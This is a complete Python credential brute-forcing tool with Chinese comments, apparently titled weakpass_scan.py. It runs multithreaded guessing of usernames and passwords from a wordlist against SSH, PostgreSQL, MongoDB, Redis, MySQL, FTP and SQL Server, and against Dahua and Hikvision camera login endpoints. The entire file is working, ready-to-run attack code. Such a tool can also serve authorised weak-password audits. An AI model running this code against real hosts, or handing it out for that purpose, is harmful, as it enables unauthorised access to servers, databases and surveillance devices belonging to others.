#!/usr/bin/env python
# -*- coding: utf-8 -*-
import ftplib
import queue
import threading
import time
import logging
import socket
from optparse import OptionParser
import pymysql, psycopg2, redis, pymongo, pymssql
import requests
import paramiko

from user_pass_data import username_dict, passwords_list



#################公有类#################
class CommonFun(object):
    """docstring for CommonFun"""
    def __init__(self):
        super(CommonFun, self).__init__()

    def set_log(self,lname):
        logger = logging.getLogger(lname)
        logger.setLevel(logging.DEBUG)

        ch = logging.StreamHandler()
        ch.setLevel(logging.DEBUG)

        formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
        ch.setFormatter(formatter)

        logger.addHandler(ch)

    def show_log(self, lname, msg):
        a = logging.getLogger(lname)
        a.debug(msg)

    def show_result(self, lname, rlist):
        if rlist:
            print("###################################################################")
            for x in rlist:
                self.show_log(lname,x)
        else:
            print("not found...")


#################SSH爆破模块#################
class SshBruter(CommonFun):
    def __init__(self, *args):
        super(SshBruter, self).__init__()
        (options,arg,userlt,pwdlt) = args
        self.host = options.host
        self.port = int(options.port)
        self.ulines = userlt
        self.plines = pwdlt
        self.threadnum = options.threadnum
        self.timeout = options.timeout
        self.result = []
        self.set_log(self.host)
        self.qlist = queue.Queue()
        self.is_exit = False
        print(self.host,self.threadnum)

    def get_queue(self):
        for name in self.ulines:
            for pwd in self.plines:
                name = name.strip()
                pwd = pwd.strip()
                self.qlist.put(name + ':' + pwd)

    def thread(self):
        while not self.qlist.empty():
            if not self.is_exit:
                name, pwd = self.qlist.get().split(':')
                if "{user}" in pwd:
                    pwd = pwd.replace("{user}", name)
                try:
                    ssh = paramiko.SSHClient()
                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    ssh.connect(hostname=self.host,port=self.port,username=name,password=pwd,timeout=self.timeout)
                    time.sleep(0.05)
                    ssh.close()
                    s = "[OK] %s:%s" % (name,pwd)
                    self.show_log(self.host,s)
                    self.result.append(s)
                except socket.timeout:
                    self.show_log(self.host,"Timeout...")
                    self.qlist.put(name + ':' + pwd)
                    time.sleep(3)
                except Exception as e:
                    error = "[Error] %s:%s" % (name,pwd)
                    self.show_log(self.host,error)
                    pass
            else:
                break

    def run(self):
        self.get_queue()
        starttime = time.time()

        threads = []
        for x in range(1,self.threadnum+1):
            t = threading.Thread(target=self.thread)
            threads.append(t)
            t.setDaemon(True) #主线程完成后不管子线程有没有结束，直接退出
            t.start()

        try:
            while True:
                if self.qlist.empty():
                    break
                else:
                    time.sleep(1)
        except KeyboardInterrupt:
            self.is_exit = True
            print("Exit the program...")
        print("Waiting...")
        time.sleep(5)

        self.show_result(self.host,self.result)
        finishetime = time.time()
        print("Used time: %f" % (finishetime-starttime))



#################postgresql爆破模块#################
class postgresqlBruter(CommonFun):
    def __init__(self, *args):
        super(postgresqlBruter, self).__init__()
        (options,arg,userlt,pwdlt) = args
        self.host = options.host
        self.port = int(options.port)
        self.ulines = userlt
        self.plines = pwdlt
        self.threadnum = options.threadnum
        self.timeout = options.timeout
        self.result = []
        self.set_log(self.host)
        self.qlist = queue.Queue()
        self.is_exit = False
        print(self.host,self.threadnum)

    def get_queue(self):
        for name in self.ulines:
            for pwd in self.plines:
                name = name.strip()
                pwd = pwd.strip()
                self.qlist.put(name + ':' + pwd)

    def thread(self):
        while not self.qlist.empty():
            if not self.is_exit:
                name,pwd = self.qlist.get().split(':')
                if "{user}" in pwd:
                    pwd = pwd.replace("{user}", name)
                try:
                    pgscon = psycopg2.connect(host=self.host, port=self.port, user=name, password=pwd)
                    time.sleep(0.02)
                    pgscon.close()
                    s = "[OK] %s:%s" % (name,pwd)
                    self.show_log(self.host,s)
                    self.result.append(s)
                except socket.timeout:
                    self.show_log(self.host,"Timeout...")
                    self.qlist.put(name + ':' + pwd)
                    time.sleep(3)
                except Exception as e:
                    # print(e)
                    error = "[Error] %s:%s" % (name,pwd)
                    self.show_log(self.host,error)
                    pass
            else:
                break

    def run(self):
        self.get_queue()
        starttime = time.time()

        threads = []
        for x in range(1,self.threadnum+1):
            t = threading.Thread(target=self.thread)
            threads.append(t)
            t.setDaemon(True) #主线程完成后不管子线程有没有结束，直接退出
            t.start()

        try:
            while True:
                if self.qlist.empty():
                    break
                else:
                    time.sleep(1)
        except KeyboardInterrupt:
            self.is_exit = True
            print("Exit the program...")
        print("Waiting...")
        time.sleep(5)

        self.show_result(self.host,self.result)
        finishetime = time.time()
        print("Used time: %f" % (finishetime-starttime))


#################mongedb爆破模块#################
class mongedbBruter(CommonFun):
    def __init__(self, *args):
        super(mongedbBruter, self).__init__()
        (options, arg, userlt, pwdlt) = args
        self.host = options.host
        self.port = int(options.port)
        self.ulines = userlt
        self.plines = pwdlt
        self.threadnum = options.threadnum
        self.timeout = options.timeout
        self.result = []
        self.set_log(self.host)
        self.qlist = queue.Queue()
        self.is_exit = False
        print(self.host, self.threadnum)

    def get_queue(self):
        for name in self.ulines:
            for pwd in self.plines:
                name = name.strip()
                pwd = pwd.strip()
                self.qlist.put(name + ':' + pwd)

    def thread(self):
        pymongo_ver = pymongo.version
        while not self.qlist.empty():
            if not self.is_exit:
                name, pwd = self.qlist.get().split(':')
                if "{user}" in pwd:
                    pwd = pwd.replace("{user}", name)
                try:
                    if int(pymongo_ver.split(".")[0]) >= 4:
                        conn = pymongo.MongoClient(host=self.host, port=self.port, username=name, password=pwd, socketTimeoutMS=3000)
                        conn.list_database_names()
                    else:
                        conn = pymongo.MongoClient(host=self.host, port=self.port, socketTimeoutMS=3000)
                        if name or pwd:
                            db = conn.admin
                            db.authenticate(name, pwd)
                        else:
                            conn.list_database_names()
                    conn.close()
                    s = "[OK] %s:%s" % (name,pwd)
                    self.show_log(self.host,s)
                    self.result.append(s)
                except socket.timeout:
                    self.show_log(self.host,"Timeout...")
                    self.qlist.put(name + ':' + pwd)
                    time.sleep(3)
                except Exception as e:
                    # print(e)
                    error = "[Error] %s:%s" % (name,pwd)
                    self.show_log(self.host,error)
                    pass
            else:
                break

    def run(self):
        self.get_queue()
        starttime = time.time()

        threads = []
        for x in range(1,self.threadnum+1):
            t = threading.Thread(target=self.thread)
            threads.append(t)
            t.setDaemon(True) #主线程完成后不管子线程有没有结束，直接退出
            t.start()

        try:
            while True:
                if self.qlist.empty():
                    break
                else:
                    time.sleep(1)
        except KeyboardInterrupt:
            self.is_exit = True
            print("Exit the program...")
        print("Waiting...")
        time.sleep(5)

        self.show_result(self.host,self.result)
        finishetime = time.time()
        print("Used time: %f" % (finishetime-starttime))


# #################redis爆破模块#################
class RedisBruter(CommonFun):
    def __init__(self, *args):
        super(RedisBruter, self).__init__()
        (options, arg, pwdlt) = args
        self.host = options.host
        self.port = options.port
        self.plines = pwdlt
        self.threadnum = options.threadnum
        self.timeout = options.timeout
        self.result = []
        self.set_log(self.host)
        self.qlist = queue.Queue()
        self.is_exit = False
        print(self.host, self.threadnum)

    def get_queue(self):
        for pwd in self.plines:
            pwd = pwd.strip()
            self.qlist.put(pwd)

    def thread(self):
        while not self.qlist.empty():
            pwd = self.qlist.get()
            if "{user}" in pwd:
                pwd = pwd.replace("{user}", "redis")
            try:
                conn = redis.Redis(host=self.host, port=self.port, password=pwd)
                conn.ping()
                # time.sleep(0.05)
                s = "[OK] :%s" % (pwd)
                if pwd == "":
                    s += "(no password)"
                self.show_log(self.host,s)
                self.result.append(s)
            except socket.timeout:
                self.show_log(self.host,"Timeout...")
                self.qlist.put(':' + pwd)
                time.sleep(1)
            except Exception as e:
                error = "[Error] :%s" % (pwd)
                self.show_log(self.host,error)
                pass

    def run(self):
        self.get_queue()
        starttime = time.time()

        threads = []
        for x in range(1,self.threadnum+1):
            t = threading.Thread(target=self.thread)
            threads.append(t)
            t.setDaemon(True) #主线程完成后不管子线程有没有结束，直接退出
            t.start()

        try:
            while True:
                if self.qlist.empty():
                    break
                else:
                    time.sleep(1)
        except KeyboardInterrupt:
            self.is_exit = True
            print("Exit the program...")
        print("Waiting...")
        time.sleep(5)

        self.show_result(self.host,self.result)
        finishetime = time.time()
        print("Used time: %f" % (finishetime-starttime))


#################MySQL爆破模块#################
class MysqlBruter(CommonFun):
    """docstring for MysqlBruter"""
    def __init__(self, *args):
        super(MysqlBruter, self).__init__()
        (options, arg, userlt, pwdlt) = args
        self.host = options.host
        self.port = int(options.port)
        self.ulines = userlt
        self.plines = pwdlt
        self.threadnum = options.threadnum
        self.timeout = options.timeout
        self.result = []
        self.set_log(self.host)
        self.qlist = queue.Queue()
        self.is_exit = False
        print(self.host, self.threadnum)

    def get_queue(self):
        for name in self.ulines:
            for pwd in self.plines:
                name = name.strip()
                pwd = pwd.strip()
                self.qlist.put(name + ':' + pwd)

    def thread(self):
        while not self.qlist.empty():
            name,pwd = self.qlist.get().split(':')
            if "{user}" in pwd:
                pwd = pwd.replace("{user}", name)
            try:
                conn = pymysql.connect(host=self.host, user=name, passwd=pwd, db='mysql', port=self.port)
                if conn:
                    # time.sleep(0.05)
                    conn.close()
                s = "[OK] %s:%s" % (name,pwd)
                self.show_log(self.host,s)
                self.result.append(s)
            except socket.timeout:
                self.show_log(self.host,"Timeout")
                self.qlist.put(name + ':' + pwd)
                time.sleep(3)
            except Exception as e:
                # print(e)
                error = "[Error] %s:%s" % (name,pwd)
                self.show_log(self.host,error)
                pass

    def run(self):
        self.get_queue()
        starttime = time.time()

        threads = []
        for x in range(1,self.threadnum+1):
            t = threading.Thread(target=self.thread)
            threads.append(t)
            t.setDaemon(True) #主线程完成后不管子线程有没有结束，直接退出
            t.start()

        try:
            while True:
                if self.qlist.empty():
                    break
                else:
                    time.sleep(1)
        except KeyboardInterrupt:
            self.is_exit = True
            print("Exit the program...")
        print("Waiting...")
        time.sleep(5)

        self.show_result(self.host,self.result)
        finishetime = time.time()
        print("Used time: %f" % (finishetime-starttime))


#################FTP爆破模块#################
class FtpBruter(CommonFun):
    """docstring for MysqlBruter"""
    def __init__(self, *args):
        super(FtpBruter, self).__init__()
        (options, arg, userlt, pwdlt) = args
        self.host = options.host
        self.port = int(options.port)
        self.ulines = userlt
        self.plines = pwdlt
        self.threadnum = options.threadnum
        self.timeout = options.timeout
        self.result = []
        self.set_log(self.host)
        self.qlist = queue.Queue()
        self.is_exit = False

        print(self.host, self.threadnum)

    def get_queue(self):
        for name in self.ulines:
            for pwd in self.plines:
                name = name.strip()
                pwd = pwd.strip()
                self.qlist.put(name + ':' + pwd)

    def anonymous_login(self):
        # 匿名登录
        try:
            if not self.is_exit:
                ftpclient = ftplib.FTP()
                ftpclient.connect(host=self.host, port=self.port)
                ftpclient.login()
                ftpclient.close()
                s = "[OK] %s:%s" % ("匿名登录", "匿名登录")
                self.show_log(self.host, s)
                self.result.append(s)
                self.is_exit = True
                self.qlist.queue.clear()
        except Exception as e:
            print("匿名登录error：", e)


    def thread(self):
        while not self.qlist.empty():
            name,pwd = self.qlist.get().split(':')
            if "{user}" in pwd:
                pwd = pwd.replace("{user}", name)
            try:
                ftpclient = ftplib.FTP()
                ftpclient.connect(host=self.host, port=self.port, timeout=3)
                ftpclient.login(name, pwd)
                ftpclient.close()

                s = "[OK] %s:%s" % (name,pwd)
                self.show_log(self.host,s)
                self.result.append(s)
            except socket.timeout:
                self.show_log(self.host,"Timeout")
                self.qlist.put(name + ':' + pwd)
                time.sleep(3)
            except Exception as e:
                print(e)
                error = "[Error] %s:%s" % (name,pwd)
                self.show_log(self.host,error)
                pass

    def run(self):
        starttime = time.time()
        self.anonymous_login()
        if not self.is_exit:
            self.get_queue()
            starttime = time.time()
            threads = []
            for x in range(1,self.threadnum+1):
                t = threading.Thread(target=self.thread)
                threads.append(t)
                t.setDaemon(True) #主线程完成后不管子线程有没有结束，直接退出
                t.start()

            try:
                while True:
                    if self.qlist.empty():
                        break
                    else:
                        time.sleep(1)
            except KeyboardInterrupt:
                self.is_exit = True
                print("Exit the program...")
        print("Waiting...")
        time.sleep(5)

        self.show_result(self.host,self.result)
        finishetime = time.time()
        print("Used time: %f" % (finishetime-starttime))


#################Sqlserver(mssql)爆破模块#################
class SqlserverBruter(CommonFun):
    def __init__(self, *args):
        super(SqlserverBruter, self).__init__()
        (options, arg, userlt, pwdlt) = args
        self.host = options.host
        self.port = int(options.port)
        self.ulines = userlt
        self.plines = pwdlt
        self.threadnum = options.threadnum
        self.timeout = options.timeout
        self.result = []
        self.set_log(self.host)
        self.qlist = queue.Queue()
        self.is_exit = False
        print(self.host, self.threadnum)

    def get_queue(self):
        for name in self.ulines:
            for pwd in self.plines:
                name = name.strip()
                pwd = pwd.strip()
                self.qlist.put(name + ':' + pwd)

    def thread(self):
        while not self.qlist.empty():
            name,pwd = self.qlist.get().split(':')
            if "{user}" in pwd:
                pwd = pwd.replace("{user}", name)
            try:
                conn = pymssql.connect(host=self.host, port=self.port, user=name, password=pwd)
                if conn:
                    # time.sleep(0.05)
                    conn.close()
                s = "[OK] %s:%s" % (name,pwd)
                self.show_log(self.host,s)
                self.result.append(s)
            except socket.timeout:
                self.show_log(self.host,"Timeout")
                self.qlist.put(name + ':' + pwd)
                time.sleep(3)
            except Exception as e:
                print(e)
                error = "[Error] %s:%s" % (name,pwd)
                self.show_log(self.host,error)
                pass

    def run(self):
        self.get_queue()
        starttime = time.time()

        threads = []
        for x in range(1,self.threadnum+1):
            t = threading.Thread(target=self.thread)
            threads.append(t)
            t.setDaemon(True) #主线程完成后不管子线程有没有结束，直接退出
            t.start()

        try:
            while True:
                if self.qlist.empty():
                    break
                else:
                    time.sleep(1)
        except KeyboardInterrupt:
            self.is_exit = True
            print("Exit the program...")
        print("Waiting...")
        time.sleep(5)

        self.show_result(self.host,self.result)
        finishetime = time.time()
        print("Used time: %f" % (finishetime-starttime))


class DahuaBruter(CommonFun):
    def __init__(self, *args):
        super(DahuaBruter, self).__init__()
        (options, arg, userlt, pwdlt) = args
        self.host = options.host
        self.port = options.port
        self.ulines = userlt
        self.plines = pwdlt
        self.threadnum = options.threadnum
        self.timeout = options.timeout
        self.result = []
        self.set_log(self.host)
        self.qlist = queue.Queue()
        self.is_exit = False
        print(self.host, self.threadnum)

    def get_queue(self):
        for name in self.ulines:
            for pwd in self.plines:
                name = name.strip()
                pwd = pwd.strip()
                self.qlist.put(name + ':' + pwd)

    def thread(self):
        ip = self.host + ":" + self.port
        url = f"http://{ip}/RPC2_Login"
        headers = {
            'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
            'Host': ip,
            'Origin': 'http://' + ip,
            'Referer': 'http://' + ip,
            'Accept': 'application/json, text/javascript, */*; q=0.01',
            'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
            'Accept-Encoding': 'gzip, deflate',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Connection': 'close',
            'X-Requested-With': 'XMLHttpRequest',
        }
        while not self.qlist.empty():
            name,pwd = self.qlist.get().split(':')
            if "{user}" in pwd:
                pwd = pwd.replace("{user}", name)
            print(name,pwd)
            _json = {
                "method": "global.login",
                "params": {
                    "userName": name,
                    "password": pwd,
                    "clientType": "Web3.0",
                    "loginType": "Direct",
                    "authorityType": "Default",
                    "passwordType": "Plain",
                },
                "id": 1,
                "session": 0,
            }
            try:
                r = requests.post(url, headers=headers, json=_json, verify=False, timeout=5)
                if r.status_code == 200 and r.json()['result'] == True:
                    s = "[OK] %s:%s" % (name,pwd)
                    self.show_log(self.host,s)
                    self.result.append(s)
            except socket.timeout:
                self.show_log(self.host,"Timeout")
                self.qlist.put(name + ':' + pwd)
                time.sleep(3)
                print("Timeout")
            except Exception as e:
                print(e)
                error = "[Error] %s:%s" % (name,pwd)
                self.show_log(self.host,error)
                pass

    def run(self):
        self.get_queue()
        starttime = time.time()

        threads = []
        for x in range(1,self.threadnum+1):
            t = threading.Thread(target=self.thread)
            threads.append(t)
            t.setDaemon(True) #主线程完成后不管子线程有没有结束，直接退出
            t.start()

        try:
            while True:
                if self.qlist.empty():
                    break
                else:
                    time.sleep(1)
        except KeyboardInterrupt:
            self.is_exit = True
            print("Exit the program...")
        print("Waiting...")
        time.sleep(5)

        self.show_result(self.host,self.result)
        finishetime = time.time()
        print("Used time: %f" % (finishetime-starttime))

class HikvisionBruter(CommonFun):
    def __init__(self, *args):
        super(HikvisionBruter, self).__init__()
        (options, arg, userlt, pwdlt) = args
        self.host = options.host
        self.port = options.port
        self.ulines = userlt
        self.plines = pwdlt
        self.threadnum = options.threadnum
        self.timeout = options.timeout
        self.result = []
        self.set_log(self.host)
        self.qlist = queue.Queue()
        self.is_exit = False

    def get_queue(self):
        for name in self.ulines:
            for pwd in self.plines:
                name = name.strip()
                pwd = pwd.strip()
                self.qlist.put(name + ':' + pwd)

    def thread(self):
        ip = self.host + ":" + self.port
        url = f"http://{ip}/ISAPI/Security/userCheck"
        headers = {
            'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
            'Connection': 'close'
        }
        while not self.qlist.empty():
            name,pwd = self.qlist.get().split(':')
            if "{user}" in pwd:
                pwd = pwd.replace("{user}", name)
            # print(name,pwd)
            try:
                r = requests.get(url, auth=(name, pwd), timeout=10, headers=headers, verify=False)
                print(r.status_code)
                print(r.text)
                if r.status_code == 200 and 'userCheck' in r.text and 'statusValue' in r.text and '200' in r.text:
                    s = "[OK] %s:%s" % (name,pwd)
                    self.show_log(self.host,s)
                    self.result.append(s)
            except socket.timeout:
                self.show_log(self.host,"Timeout")
                self.qlist.put(name + ':' + pwd)
                time.sleep(3)
                print("Timeout")
            except Exception as e:
                print(e)
                # error = "[Error] %s:%s" % (name,pwd)
                # self.show_log(self.host,error)
                pass

    def run(self):
        self.get_queue()
        starttime = time.time()

        threads = []
        for x in range(1,self.threadnum+1):
            t = threading.Thread(target=self.thread)
            threads.append(t)
            t.setDaemon(True) #主线程完成后不管子线程有没有结束，直接退出
            t.start()

        try:
            while True:
                if self.qlist.empty():
                    break
                else:
                    time.sleep(1)
        except KeyboardInterrupt:
            self.is_exit = True
            print("Exit the program...")
        print("Waiting...")
        time.sleep(5)

        self.show_result(self.host,self.result)
        finishetime = time.time()
        print("Used time: %f" % (finishetime-starttime))


def main():
    parser = OptionParser(usage='Usage: python weakpass_scan.py [type] -i [host] -p [port] -o [timeout] -t [thread]')
    parser.add_option('-i','--host',dest='host',help='target ip')
    parser.add_option('-p','--port',dest='port',help='target port')
    parser.add_option('-o','--timeout',type=int,dest='timeout',default=5,help='timeout')
    parser.add_option('-t','--thread',type=int,dest='threadnum',default=10,help='threadnum')

    (options, args) = parser.parse_args()

    if not args or not options.host:
        parser.print_help()
        exit()

    if args[0]=='ssh':
        postgresql = SshBruter(options, args, username_dict['ssh'], passwords_list)
        postgresql.run()
    elif args[0]=='postgresql':
        postgresql = postgresqlBruter(options, args, username_dict['postgresql'], passwords_list)
        postgresql.run()
    elif args[0]=='redis':
        redis = RedisBruter(options, args, passwords_list)
        redis.run()
    elif args[0]=='mysql':
        mysql = MysqlBruter(options, args, username_dict['mysql'], passwords_list)
        mysql.run()
    elif args[0]=='mongodb':
        mongo = mongedbBruter(options, args, username_dict['mongodb'], passwords_list)
        mongo.run()
    elif args[0]=='ftp':
        mongo = FtpBruter(options, args, username_dict['ftp'], passwords_list)
        mongo.run()
    elif args[0]=='sqlserver' or args[0] == "mssql":
        # mssql is sqlserver
        mongo = SqlserverBruter(options, args, username_dict['mssql'], passwords_list)
        mongo.run()
    elif args[0]=='dahua':
        mongo = DahuaBruter(options, args, username_dict['dahua'], passwords_list)
        mongo.run()
    elif args[0]=='hikvision':
        mongo = HikvisionBruter(options, args, username_dict['hikvision'], passwords_list)
        mongo.run()
    else:
        print("type must be ssh or postgresql or redis or mysql or mongodb or ftp or sqlserver or mssql or dahua or hikvision")

if __name__ == '__main__':
    main()